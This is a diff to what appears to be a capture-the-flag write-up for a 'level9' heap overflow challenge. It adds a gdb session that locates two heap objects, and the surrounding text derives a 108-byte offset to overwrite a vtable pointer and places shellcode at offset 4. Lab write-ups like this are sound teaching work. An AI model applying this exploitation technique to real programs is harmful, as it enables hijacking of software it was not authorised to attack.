@@ -32,6 +32,25 @@ controls the whole chain.
 - offset 108 (derivation, gdb): break `*0x8048650` (both objects built), `run AAA`.
   `obj1 = x/wx $esp+0x1c` = `0x804a008`, `obj2 = $ebx` = `0x804a078` → gap `0x70 = 112`.
   memcpy starts at `obj1+4`, so distance to `obj2`'s vtable ptr = `0x70 − 4 = 0x6c = 108`.
+    - How to get each addresses.
+      ```bash
+          break *0x08048650
+          Breakpoint 1 at 0x8048650
+          (gdb) run AAA
+          Starting program: /home/user/level9/level9 AAA
+
+          Breakpoint 1, 0x08048650 in main ()
+          (gdb) x/wx $esp+0x1c
+          0xbffff71c:     0x0804a008
+          (gdb) break *0x08048654
+          Breakpoint 2 at 0x8048654
+          (gdb) continue
+          Continuing.
+
+          Breakpoint 2, 0x08048654 in main ()
+          (gdb) x/wx $esp+0x18
+          0xbffff718:     0x0804a078
+      ```
 - Addresses: memcpy dest `obj1+4 = 0x804a00c` = **offset 0** of our input. Shellcode placed
   at offset 4 = `0x804a010`.
 - Values / layout (112 bytes total):
